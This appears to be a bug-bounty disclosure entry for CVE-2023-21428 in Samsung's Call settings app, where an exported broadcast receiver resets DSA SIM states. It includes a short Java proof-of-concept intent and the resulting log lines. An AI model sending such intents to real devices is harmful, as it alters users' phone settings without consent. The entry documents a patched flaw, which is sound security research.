# Details

<table>
    <tr>
        <td>Name</td>
        <td>Call settings</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.app.telephonyui</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.19</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2023.01.04</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-21428">CVE-2023-21428</a> (SVE-2022-2320)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$730</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/115.%20Call%20settings%20—%20Reset%20DSA%20SIM%20states/Oversecured_report.png)

Oversecured found in the Call settings app in the `com/samsung/android/app/telephonyui/netsettings/ui/simcardmanager/NetworkStatusReceiver.java` file handling of the `com.sec.android.app.setupwizard.SETUPWIZARD_COMPLETE` action, which resets DSA SIM states when processing a received broadcast.

**Proof of Concept**

```java
Intent i = new Intent("com.sec.android.app.setupwizard.SETUPWIZARD_COMPLETE");
i.setPackage("com.samsung.android.app.telephonyui");
sendBroadcast(i);
```

Result:
```
09-19 16:32:26.249 24710 24710 I NU.NetworkStatusReceiverUtils: resetSimValue simValue = 0, key = dsa_sim1_value
09-19 16:32:26.250 24710 24710 I NU.NetworkStatusReceiverUtils: resetSimValue simValue = 0, key = dsa_sim2_value
```
